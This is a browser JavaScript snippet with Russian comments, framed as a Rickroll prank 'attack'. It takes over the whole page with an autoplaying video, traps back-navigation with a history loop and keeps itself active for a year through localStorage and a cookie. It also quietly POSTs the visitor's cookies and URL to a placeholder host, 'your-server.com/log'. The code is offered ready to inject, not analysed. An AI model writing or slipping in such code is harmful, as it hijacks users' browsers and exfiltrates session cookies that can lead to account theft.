// ===== КЛИЕНТСКИЙ СКРИПТ (РАБОТАЕТ В БРАУЗЕРЕ) =====
(function() {
    // Проверяем, активирована ли атака (храним флаг в нескольких местах)
    const isActive = localStorage.getItem('rickroll_active') === 'true' || 
                     document.cookie.includes('rickroll_active=true');
    
    if (isActive) {
        // Полный захват страницы
        document.documentElement.innerHTML = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>RICKROLL 😂</title>
                <style>
                    body { margin: 0; padding: 0; background: black; overflow: hidden; }
                    .container {
                        position: fixed;
                        top: 0; left: 0;
                        width: 100%; height: 100%;
                        background: linear-gradient(45deg, #000, #1a0000);
                        color: white;
                        text-align: center;
                        z-index: 999999;
                    }
                    h1 { font-size: 100px; margin: 20px 0; animation: bounce 1s infinite; }
                    @keyframes bounce {
                        0%,100%{ transform: translateY(0); }
                        50%{ transform: translateY(-50px); }
                    }
                    iframe {
                        width: 80%;
                        height: 60%;
                        border: 5px solid red;
                        border-radius: 20px;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>😂😂😂</h1>
                    <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0" 
                            allow="autoplay; fullscreen"></iframe>
                    <h2 style="color: red; font-size: 50px;">ТЫ ПОПАЛСЯ!</h2>
                    <p style="font-size: 20px;">Перезагрузка не поможет. Это навсегда.</p>
                </div>
                
                <script>
                    // Блокируем навигацию
                    history.pushState(null, null, location.href);
                    window.onpopstate = () => {
                        history.pushState(null, null, location.href);
                    };
                    
                    // Сохраняем состояние везде
                    localStorage.setItem('rickroll_active', 'true');
                    document.cookie = 'rickroll_active=true; path=/; max-age=31536000';
                    
                    // Отправляем данные "на сервер" (если есть куда)
                    try {
                        fetch('https://your-server.com/log', {
                            method: 'POST',
                            mode: 'no-cors',
                            body: JSON.stringify({
                                cookies: document.cookie,
                                url: location.href
                            })
                        });
                    } catch(e) {}
                <` + `/script>
            </body>
            </html>
        `;
        
        // Останавливаем выполнение всего остального
        throw new Error('RICKROLL ACTIVATED');
    }
    
    // Функция для активации (можно вызвать из консоли)
    window.activateRickroll = function() {
        localStorage.setItem('rickroll_active', 'true');
        document.cookie = 'rickroll_active=true; path=/; max-age=31536000';
        location.reload();
    };
})();
